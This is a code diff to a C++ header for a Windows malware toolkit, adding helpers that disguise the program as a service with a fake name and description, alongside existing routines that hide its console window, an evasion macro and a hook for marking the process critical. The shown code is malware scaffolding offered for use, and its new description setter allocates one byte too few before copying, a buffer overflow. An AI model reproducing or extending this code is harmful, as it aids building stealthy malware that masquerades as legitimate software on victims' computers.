@@ -1,16 +1,17 @@
 // Some Macros.
-#define RAW 0
-#define HEX 1
-#define DEC 2
-#define BIN 3
-#define TCP 4
-#define UDP 5
 
-#define SUCCEED	0
-#define PROBLEM 1
-#define OK	0
-#define DONE	0
-#define FAILED  1
+#define SUCCEED		0
+#define PROBLEM 	1
+#define ADMIN		0
+#define USER		1
+#define OK		0
+#define DONE		0
+#define FAILED  	1
+#define FILE_EXIST	1
+#define FILE_NOT_FOUND  0
+#define ON  		1
+#define OFF 		0
+#define ERROR_SUCCESS	0
 
 #define FUNCTION_EVADE int x
 
@@ -21,17 +22,11 @@
 
 #define KEEP_PID	0
 
-#define PAMAX	4000
-
-#define ON  0x01
-#define OFF 0x00
+#define PAMAX	4096
 
 #define _CRT_SECURE_NO_WARNINGS
 #define _CRT_NONSTDC_NO_DEPRECATE
 #define WIN32_LEAN_AND_MEAN
-
-#define FILE_EXIST		0x01
-#define FILE_NOT_FOUND  0x00
 
 // Headers To Include
 #include <iostream>
@@ -43,9 +38,10 @@
 #include <thread>
 
 #include <winsock2.h>
-#include <windows.h>
 #include <psapi.h>
 #include <signal.h>
+#include <shellapi.h>
+#include <windows.h>
 
 // Accessing Some Functions From Different Namespaces.
 using		std::string;
@@ -64,6 +60,9 @@ typedef long (WINAPI* RtlSetProcessIsCritical)(
 struct c_malware_stat__t{
 	char	name[PAMAX];
 	char	fakename[155];
+	char*	fakedescription = NULL;
+
+	int	privileges;
 
 	size_t  size;
 };
@@ -96,21 +95,29 @@ void cvinit(int argc, char** argv){
 
 void SetMalwareMode(int mode){
 	if (mode == ON){
-		HANDLE fh;
 		HWND   wh;
 
-		fh=CreateFile(_argv__[0], GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 		AllocConsole();
 		wh=FindWindow("ConsoleWindowClass", NULL);
 		ShowWindow(wh, 0x00);
 	}
 }
 
-void SetMalwareFakeName(const char* name){
+void SetMalwareFakeService(const char* name){
 	strncpy(Current.fakename, name, 155);
+}
+void SetMalwareFakeDescription(const char* desc){
+	if (Current.fakedescription){
+		free(Current.fakedescription);
+	}
+
+	Current.fakedescription=(char*)malloc(strlen(desc));
+	strcpy(Current.fakedescription, desc);
 }
 
 void cvexit(int x){
+	if (Current.fakedescription)
+		free(Current.fakedescription);
 	exit(x);
 }
 
